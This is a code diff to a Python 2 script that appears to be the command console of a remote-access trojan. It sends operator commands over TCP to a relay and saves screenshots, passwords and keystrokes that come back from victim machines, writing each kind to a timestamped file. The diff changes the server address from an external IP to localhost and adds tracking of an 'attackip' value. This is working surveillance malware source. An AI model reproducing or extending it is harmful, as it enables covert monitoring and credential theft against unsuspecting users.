@@ -14,7 +14,7 @@ signal.signal(signal.SIGINT, signal_handler)
 def send(client):
     cmd = raw_input("Enter command: ")
     pkt = Packet()
-    pkt.length = len(cmd)
+    pkt.toIP = attackip
     pkt.state = cmd
     pkt.send(client)
     # inp = "!" + str(len(cmd)) + "!" + cmd
@@ -23,32 +23,31 @@ def send(client):
 def receive(s):
     base = "C:\Users\Matt\Desktop\\testfolder"
     while True:
-        # state = getTypeOfCommand(s)
-        # size = getSizeOfCommand(s)
-        # data = getData(s,size)
         pkt = Packet()
         pkt.construct(s)
         t = time.time()
         if pkt.state == "100":
-            print pkt
+            print pkt.data
+            global attackip
+            attackip = pkt.data
         elif pkt.state == "143":
             path = base + "\screenshot." + str(t) + ".png"
-            im = Image.open(StringIO(data))
+            im = Image.open(StringIO(pkt.data))
             im.save("C:\Users\Matt\Desktop\\testpic.png",'png')
         elif pkt.state == "144":
             path = base + "\passwords." + str(t) + ".txt"
             f = open(path,"w")
-            f.write(data)
+            f.write(pkt.data)
             f.close()
         elif pkt.state == "145":
             path = base + "\keystrokes." + str(t) + ".txt"
             f = open(path,"w")
-            f.write(data)
+            f.write(pkt.data)
             f.close()
         else:
             print "don't know that one"
 
-ip = '25.135.29.20'
+ip = 'localhost'
 port = 5720
 
 TCP_IP = ip
@@ -58,6 +57,8 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((TCP_IP, TCP_PORT))
 
 threading.Thread(target=receive,args=[s]).start()
+
+attackip = ""
 
 while 1:
     send(s)
